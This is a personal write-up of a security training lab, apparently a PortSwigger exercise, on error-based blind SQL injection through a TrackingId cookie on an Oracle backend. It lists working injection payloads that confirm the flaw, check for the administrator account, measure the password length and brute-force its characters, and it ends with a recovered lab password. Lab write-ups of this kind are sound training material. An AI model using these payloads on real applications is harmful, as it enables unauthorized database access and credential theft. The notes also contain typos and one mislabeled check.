## Lab analysis 
- result of sql query is not returned
- application doesnot respond any differently based on whether the query return any rows
- if the sql query causes an error, then the application returns a custom error message

there is table `users` with columns named `username` and `password`

## Aim Exploit the blind sql and find the password of the administrator


## burp
Cookie: TrackingId=9Bq0SZ0PA8uupFFy; 

## Confirming the vulnerability

' || (select '' from dual) || '  -> gives 200 response
' || (select '' from randomtable) || ' -> gives 500 response

hence it is vulnerable

## Checking if users table exist or not

' || (select '' from users) || ' 
this is also a valid payload but in this case ,it breaks the system since it returns '' for every row present in users table

so we will modify little bit

' || (select '' from dual where rownum = 1) || '  -> gives 200 response which indicates users table exist


## checking if administrator user exist or  not in users table
 
' || (select '' from users where username = 'administrator')|| ' 
this payload return true regardless the administrator exist or not.
i.e if administrator user exist it will return '' 
	if doesnot exist it will return nothing
thus this payload is not much of use.

`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' `
here from ..... will run first if administrator username exist then the select case query runs giving us error if administrator username doesnot exist then the select case query doesnot runs thus no error








## checking the length of password

`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator'and length(password)>0)||' `
here from users where ..... will run first if use username administrator exist(which do exist, proved in previous step) and lenght of password field >1 then gives error if no doesnot give error


--> status 200 at >20 --> so lenght of password in 20



## Bruiteforcing the password

'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and substr(password,1,1) ='a') ||'

8b5j5yhyqq6ikzl0i7sl



















